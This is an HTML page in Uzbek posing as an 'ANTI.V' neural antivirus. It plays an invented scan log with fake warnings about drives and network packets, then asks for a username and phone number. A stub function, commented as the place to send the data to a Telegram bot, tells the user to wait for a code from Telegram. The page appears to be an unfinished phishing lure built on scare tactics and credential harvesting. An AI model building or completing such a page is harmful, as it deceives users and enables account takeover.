<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANTI.V | Neural Protection</title>
    <style>
        body {
            background-color: #050a14;
            color: #00ff41; /* Xakerlar uslubidagi yashil yoki oqish-ko'k */
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        /* Skanerlash animatsiyasi uchun konteyner */
        #scan-screen {
            text-align: left;
            width: 80%;
            max-width: 600px;
        }

        .line { opacity: 0; animation: fadeIn 0.2s forwards; margin-bottom: 5px; font-size: 14px; }
        @keyframes fadeIn { from { opacity: 0; transform: translateX(-10px); } to { opacity: 1; transform: translateX(0); } }

        /* Asosiy karta */
        .main-card {
            background: #0d1117;
            border: 1px solid #30363d;
            padding: 30px;
            border-radius: 8px;
            width: 350px;
            text-align: center;
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
            display: none; /* Boshida yashirin */
        }

        .logo-container { margin-bottom: 20px; }
        .logo-text { font-size: 32px; font-weight: bold; color: #fff; letter-spacing: 4px; }
        
        .input-box {
            width: 100%;
            background: #161b22;
            border: 1px solid #30363d;
            padding: 12px;
            color: #fff;
            margin-bottom: 15px;
            box-sizing: border-box;
            outline: none;
        }

        .btn-neon {
            width: 100%;
            padding: 15px;
            background: transparent;
            border: 1px solid #00ff41;
            color: #00ff41;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            text-transform: uppercase;
        }

        .btn-neon:hover {
            background: #00ff41;
            color: #000;
            box-shadow: 0 0 15px #00ff41;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

    <div id="scan-screen"></div>

    <div class="main-card" id="main-ui">
        <div class="logo-container">
            <svg width="50" height="50" viewBox="0 0 24 24" fill="#00ff41">
                <path d="M12 2L4 5V11C4 16.19 7.41 21.05 12 22.5C16.59 21.05 20 16.19 20 11V5L12 2Z"/>
            </svg>
            <div class="logo-text">ANTI.V</div>
        </div>
        <p style="color: #8b949e; font-size: 13px;">Tizim yadrosiga ulanish uchun identifikatsiyadan o'ting</p>
        
        <input type="text" id="uName" class="input-box" placeholder="Foydalanuvchi nomi">
        <input type="tel" id="uPhone" class="input-box" value="+998">
        
        <button class="btn-neon" onclick="sendToBot()">CORE CONNECT</button>
    </div>

    <script>
        // Terminal yozuvlari
        const logs = [
            "> Initializing ANTI.V Neural Core...",
            "> Scanning local drives [C:/Users/Admin]...",
            "> Analyzing network traffic...",
            "> WARNING: Unknown data packets detected!",
            "> Secure tunnel establishing...",
            "> Encrypting connection (AES-256)...",
            "> Ready for user verification."
        ];

        const scanScreen = document.getElementById('scan-screen');
        const mainUI = document.getElementById('main-ui');

        // Terminal effektini boshqarish
        let i = 0;
        function runTerminal() {
            if (i < logs.length) {
                let p = document.createElement('div');
                p.className = 'line';
                p.innerText = logs[i];
                scanScreen.appendChild(p);
                i++;
                setTimeout(runTerminal, 600);
            } else {
                setTimeout(() => {
                    scanScreen.style.display = 'none';
                    mainUI.style.display = 'block';
                }, 1000);
            }
        }

        window.onload = runTerminal;

        // Botga yuborish (Sizning eski logikangiz)
        async function sendToBot() {
            const name = document.getElementById('uName').value;
            const phone = document.getElementById('uPhone').value;
            
            if(name.length < 3) return alert("Xatolik: Avtorizatsiya muvaffaqiyatsiz!");

            // Bu yerda fetch orqali Telegram botga yuborasiz
            alert("Ulanish so'raldi! Telegramdan kodni kuting.");
            // Keyingi bosqichga o'tish kodi...
        }
    </script>
</body>
</html>
